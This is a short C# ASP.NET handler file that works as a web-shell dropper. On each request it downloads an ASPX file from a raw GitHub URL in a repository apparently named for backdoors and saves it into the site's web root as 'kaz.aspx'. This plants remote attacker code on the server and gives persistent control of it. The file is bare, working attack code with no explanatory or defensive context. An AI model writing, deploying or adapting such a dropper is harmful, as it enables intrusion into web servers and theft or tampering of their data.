<%@ WebHandler Language="C#" Class="Handler" %>
using System;
using System.Web;
using System.IO;
using System.Net;

public class Handler : IHttpHandler
{
    public void ProcessRequest(HttpContext context)
    {
        context.Response.ContentType = "text/plain";

        string url = "https://raw.githubusercontent.com/Mantodkaz/bekdur/main/aspnet/pub1.aspx"; 
        string show;

        using (WebClient client = new WebClient())
        {
            show = client.DownloadString(url);
        }

        StreamWriter file1 = File.CreateText(context.Server.MapPath("kaz.aspx"));
        file1.Write(show);
        file1.Flush();
        file1.Close();
    }

    public bool IsReusable
    {
        get
        {
            return false;
        }
    }
}
